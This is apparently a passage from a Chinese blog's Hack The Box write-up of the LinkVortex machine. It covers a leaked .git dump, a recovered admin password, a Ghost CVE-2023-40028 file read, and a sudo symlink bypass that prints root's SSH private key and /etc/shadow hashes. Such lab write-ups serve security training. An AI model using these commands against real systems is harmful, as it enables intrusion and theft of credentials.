/.git/logs/\n[12:06:09] 200 -  175B  - /.git/logs/HEAD                                   \n[12:06:09] 200 -  418B  - /.git/objects/                                    \n[12:06:09] 200 -  147B  - /.git/packed-refs\n[12:06:10] 200 -  393B  - /.git/refs/                                       \n[12:06:10] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/\n[12:06:15] 403 -  199B  - /.ht_wsr.txt                                      \n[12:06:16] 403 -  199B  - /.htaccess.sample                                 \n[12:06:16] 403 -  199B  - /.htaccess.save\n[12:06:16] 403 -  199B  - /.htaccess.bak1\n[12:06:16] 403 -  199B  - /.htaccess_orig\n[12:06:16] 403 -  199B  - /.html\n[12:06:16] 403 -  199B  - /.htaccess.orig\n[12:06:16] 403 -  199B  - /.htaccessOLD\n[12:06:16] 403 -  199B  - /.htaccess_sc                                     \n[12:06:16] 403 -  199B  - /.htm                                             \n[12:06:16] 403 -  199B  - /.htaccess_extra\n[12:06:16] 403 -  199B  - /.htaccessOLD2                                    \n[12:06:16] 403 -  199B  - /.htaccessBAK\n[12:06:17] 403 -  199B  - /.htpasswd_test                                   \n[12:06:17] 403 -  199B  - /.htpasswds\n[12:06:17] 403 -  199B  - /.httr-oauth                                      \n[12:06:18] 200 -  691KB - /.git/index                                       \n[12:07:22] 403 -  199B  - /cgi-bin/                                         \n[12:08:43] 403 -  199B  - /server-status                                    \n[12:08:43] 403 -  199B  - /server-status/                                                                   \nTask Completed\n```\n\n发现有.git文件泄露\n\n## .git文件泄露\n\n使用工具下载其泄露的文件\n\n```ptyhon\npython /git-dumper-master/git_dumper.py http://dev.linkvortex.htb /.git \n```\n\n在泄露的文件/.git/ghost/core/test/regression/api/admin/authentication.test.js中，有若干个密码（问就是一个个找）\n\n![Linkvortex/image-20241208134515379](Linkvortex/image-20241208134515379.png)\n\n![Linkvortex/image-20241208134601369](Linkvortex/image-20241208134601369.png)\n\n![Linkvortex/image-20241208134611578](Linkvortex/image-20241208134611578.png)\n\n![Linkvortex/image-20241208134623654](Linkvortex/image-20241208134623654.png)\n\n整理出来后逐一尝试，得到密码为**OctopiFociPilfer45S**\n\n利用凭证admin@linkvortex.htb/OctopiFociPilfer45S进入后台后，可以看到ghost版本为5.58，搜索后发现存在CVE-2023-40028\n\n## CVE-2023-40028\n\n![Linkvortex/image-20241208134839916](Linkvortex/image-20241208134839916.png)\n\n利用POC，查看是否能够读取文件\n\n![Linkvortex/image-20241208134950803](Linkvortex/image-20241208134950803.png)\n\n这里读取ghost组件中的敏感文件config.production.json\n\n![Linkvortex/image-20241208135224392](Linkvortex/image-20241208135224392.png)\n\n得到bob用户的密码后，使用SSH登录\n\n## 脚本利用\n\n查看bob用户可执行的权限\n\n![Linkvortex/image-20241208135307819](Linkvortex/image-20241208135307819.png)\n\n查看clean_symlink.sh脚本\n\n```sh\n#!/bin/bash\n\nQUAR_DIR=\"/var/quarantined\"\n\nif [ -z $CHECK_CONTENT ];then\n  CHECK_CONTENT=false\nfi\n\nLINK=$1\n\nif ! [[ \"$LINK\" =~ \\.png$ ]]; then\n  /usr/bin/echo \"! First argument must be a png file !\"\n  exit 2\nfi\n\nif /usr/bin/sudo /usr/bin/test -L $LINK;then\n  LINK_NAME=$(/usr/bin/basename $LINK)\n  LINK_TARGET=$(/usr/bin/readlink $LINK)\n  if /usr/bin/echo \"$LINK_TARGET\" | /usr/bin/grep -Eq '(etc|root)';then\n    /usr/bin/echo \"! Trying to read critical files, removing link [ $LINK ] !\"\n    /usr/bin/unlink $LINK\n  else\n    /usr/bin/echo \"Link found [ $LINK ] , moving it to quarantine\"\n    /usr/bin/mv $LINK $QUAR_DIR/\n    if $CHECK_CONTENT;then\n      /usr/bin/echo \"Content:\"\n      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null\n    fi\n  fi\nfi\n```\n\n丢进AI问一问\n\n![Linkvortex/image-20241208135613865](Linkvortex/image-20241208135613865.png)\n\n这里可以利用嵌套的方式绕过检查\n\n```bash\nexport CHECK_CONTENT=true\nln -s /home/bob/test.png /home/bob/exploit.png \n# 创建一个exploit.png指向test.png\n\nln -sf /root/.ssh/id_rsa /home/bob/test.png\n# 创建链接使得test.png指向id_rsa\n# 经过上述处理后，表面上exploit.png指向的是test.png，实际上指向的是id_rsa\n\nsudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/exploit.png\nLink found [ /home/bob/exploit.png ] , moving it to quarantine\nContent:\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\n\n使用id_rsa登录到root用户\n\n![Linkvortex/image-20241208140259700](Linkvortex/image-20241208140259700.png)\n\n```bash\n# /etc/shadow\nroot:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::\ndaemon:*:19579:0:99999:7:::\nbin:*:19579:0:99999:7:::\nsys:*:19579:0:99999:7:::\nsync:*:19579:0:99999:7:::\ngames:*:19579:0:99999:7:::\nman:*:19579:0:99999:7:::\nlp:*:19579:0:99999:7:::\nmail:*:19579:0:99999:7:::\nnews:*:19579:0:99999:7:::\nuucp:*:19579:0:99999:7:::\nproxy:*:19579:0:99999:7:::\nwww-data:*:19579:0:99999:7:::\nbackup:*:19579:0:99999:7:::\nlist:*:19579:0:99999:7:::\nirc:*:19579:0:99999:7:::\ngnats:*:19579:0:99999:7:::\nnobody:*:19579:0:99999:7:::\n_apt:*:19579:0:99999:7:::\nsystemd-network:*:19579:0:99999:7:::\nsystemd-resolve:*:19579:0:99999:7:::\nmessagebus:*:19579:0:99999:7:::\nsystemd-timesync:*:19579:0:99999:7:::\npollinate:*:19579:0:99999:7:::\nsshd:*:19579:0:99999:7:::\nusbmux:*:19814:0:99999:7:::\nbob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::\ndnsmasq:*:19814:0:99999:7:::\n_laurel:!:20057::::::\n```\n","tags":["HTB"]},{"title":"博客介绍","url":"/2024/12/05/Start/","content":"这里是YiM2onZhoi的GitHub个人博客，不定期分享各类靶场思路以及一些知识网址等。\n"}]